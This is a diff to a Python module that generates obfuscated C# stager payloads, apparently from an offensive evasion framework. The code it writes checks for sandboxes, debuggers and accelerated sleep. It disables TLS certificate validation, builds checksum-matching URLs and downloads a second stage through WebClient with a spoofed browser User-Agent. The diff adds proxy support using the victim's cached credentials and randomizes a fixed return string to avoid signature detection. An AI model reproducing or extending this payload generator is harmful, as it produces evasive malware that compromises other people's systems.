@@ -46,7 +46,8 @@ class PayloadModule:
                                     "USERNAME"       : ["X", "Optional: The required user account"],
                                     "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                     "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
-                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
+                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"],
+                                    "PROXY"          : ["N", "Use system proxy settings"],
                                 }
 
     def generate(self):
@@ -89,13 +90,14 @@ class PayloadModule:
         urlName = evasion_helpers.randomString()
         random.shuffle(t)
         randChars = ''.join(t)
+        randomReturn = evasion_helpers.randomString(4)
 
         payload_code += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
         payload_code += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
         payload_code += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
         payload_code += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
         payload_code += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
-        payload_code += "if (%s(%s)) {return %s;}}} return \"9vXU\";}"%(checksum8Name,urlName, urlName)
+        payload_code += "if (%s(%s)) {return %s;}}} return \"%s\";}"%(checksum8Name,urlName, urlName, randomReturn)
 
 
         # code for getData() function
@@ -107,6 +109,14 @@ class PayloadModule:
         payload_code += "static byte[] %s(string %s) {\n" %(getDataName,strName)
         payload_code += "ServicePointManager.ServerCertificateValidationCallback = %s;\n" %(validateServerCertficateName)
         payload_code += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
+
+        # Proxy
+        if self.required_options["PROXY"][0].lower() == "y":
+            defaultWebProxyName = evasion_helpers.randomString()
+            payload_code += "IWebProxy %s = WebRequest.DefaultWebProxy;\n" %(defaultWebProxyName)
+            payload_code += "%s.Credentials = CredentialCache.DefaultCredentials;\n" %(defaultWebProxyName)
+            payload_code += "%s.Proxy = %s;\n" %(webClientName, defaultWebProxyName)
+
         payload_code += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
         payload_code += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
         payload_code += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
